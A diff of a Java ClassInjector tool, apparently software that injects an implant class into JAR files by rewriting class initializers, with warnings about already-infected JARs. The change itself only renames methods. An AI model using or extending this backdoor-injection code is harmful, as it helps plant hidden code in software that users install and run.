@@ -26,17 +26,17 @@ public class ClassInjector {
         try (JarFileFiddler fiddler = JarFileFiddler.open(targetJarFilePath, outputJar)) {
             for (JarFileFiddler.WrappedJarEntry entry : fiddler) {
                 if (!entry.getName().endsWith(".class")) {
-                    entry.passOn();
+                    entry.forward();
                     continue;
                 }
                 if (entry.getEntry().getCodeSigners() != null) {
                     foundSignedClasses = true;
-                    entry.passOn();
+                    entry.forward();
                     continue;
                 }
                 if (entry.getName().equals(IMPLANT_CLASS_NAME + ".class")) {
                     System.out.println("[-] WARNING: It looks like this JAR may already be infected. Proceeding anyway.");
-                    entry.passOn();
+                    entry.forward();
                     continue;
                 }
 
@@ -69,7 +69,7 @@ public class ClassInjector {
                  * by an app.
                  */
                 modifyClinit(currentlyProcessing, implantedClass);
-                currentlyProcessing.write(entry.addAndGetStream());
+                currentlyProcessing.write(entry.replaceAndGetStream());
                 System.out.println("[+] Modified class initializer for '" + currentlyProcessing.getName() + "'.");
             }
 
